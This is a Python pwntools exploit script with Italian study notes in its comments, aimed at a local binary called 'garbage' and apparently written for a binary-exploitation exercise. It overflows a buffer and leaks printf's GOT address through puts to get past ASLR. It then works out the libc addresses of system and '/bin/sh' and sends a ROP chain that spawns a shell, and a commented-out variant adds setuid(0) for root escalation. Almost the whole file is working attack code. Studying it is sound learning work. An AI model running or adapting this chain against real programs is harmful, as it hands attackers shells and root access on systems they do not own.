#In questo caso ho ASRL attivo e quindi devo superarlo uso GOT PLT  (global offset table procedure linkage table) vedere cos'è (ha dentro gli indirizzi della libc, 
#quando il programma incontra una funzione vede se  la trova dentro la GOT)
#./garbage, vedo quanti char mi servono

from pwn import *

context(os = "Linux", arch="amd64")

#p.process("./garbage")

p = gdb.debug("./garbage", "b main")

#buffer per buffer overflow
buf = b"A"*136


"""
prima cosa TROVARE LE FUNZIONI DI LIBC CHE SONO USATE NEL PROGRAMMA!!!!
In questo caso  faccio disass main in gdb e vedo che posso usare
 -puts
 -printf
usiamo printf perchè puts non va
"""

#mi serve trovare l'offset got_puts e di plt_printf

# questo lo trovo con objdump -D garbage | grep  puts e prendo il primo offset puts@plt (0x401050)
plt_puts = p64(0x401050)

#objdump -D garbage | grep  printf e vedo printf@GLIBC... (0x404048)
got_printf= p64(0x404048)


#ropper --file garbage --search "pop rdi; ret;"
pop_rdi = p64(0x40179b)


#offset del main objdump -D garbage | grep "main"
#mi serve per tornare indietro nel main e rieseguire il buffer overflow se no quando trovo l'indirizzo l'esecuzione si ferma e se riavvio il programma cambiano tutti gli indirizzi
#non prendere il primo perchè è quello della libc quindi devo prendere quello sotto 
main = p64(0x401619)


#step 1 memory leak per ottenere info sulla memoria
#quello che faccio qui è stampare con la puts l'indirizzo della printf risolto dalla plt, quindi la puts viene eseguita attraverso l'uso della plt (che prende l'indirizzo dalla got), 

# a questo punto come parametro della puts abbiamo l'indirizzo della printf nella got che viene convertito in quello reale
payload = buf + pop_rdi + got_printf + plt_puts  + main
p.sendline(payload)


#rimango in ascolto finchè non arrivo a access denied
p.recvuntil(b"access denied.\n")

#leggo fino all'ultimo carattere (con -1 tolgo il newline \n se no non leggo bene l'indirizzo)
#ljust lo mette nella forma 8 byte e aggiunge i null byte quando manca qualcosa
#faccio l'unpack
leaked_printf_address = u64(p.recvline()[:-1].ljust(8, b'\x00'))

#print in hex
print("leaked_printf_address: 0x%x " % leaked_printf_address)



#perchè mi serve sta printf?
#ldd garbage per trovare il path di libc
#readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf
libc_printf =  0x61c90

offset = leaked_printf_address - libc_printf

#sempre con readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
libc_system = p64(offset + 0x52290)


#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
libc_binsh = p64(offset + 0x1b45bd)

print("lib_system ")


#per allinear lo stack mi serve una ret
#ropper --file=garbage --search "ret;"     altrimenti la cerco dentro libc

ret=p64(0x401016)
payload = buf + ret + pop_rdi + libc_binsh +libc_system
p.sendline(payload)




#così non si ferma il programma, se non lo metto lo script pyhton finisce e il debug si chiude
p.interactive()

#cosa faccio
#b main
#disass auth
#break indirizzo ret di auth
#c
#break main 


#usa ghidra per vedere quale funziona usa strcpy() 
#metti un breakpoint sulla ret di auth

#step 2 eseguo l'exploit per eseguire system per esempio





#posso anche fare una privilege escalation (innanzitutto devo fare chown root:root garbage e poi chmod 4777 garbage per settarlo che viene eseguito come root in ogni caso )
#trovo con readelf setuid() e gli passo 0 così prendo i permessi di root
"""
payload = buf + ret + pop_rdi+ p64(0) + libc_setuid 
payload+=pop_rdi + libc_binsh +libc_system
"""

#step 2 exploit

#per eseguire di nuovo il payload devo riportare il programma nel main all'inizio in modo da eseguire un nuovo payload
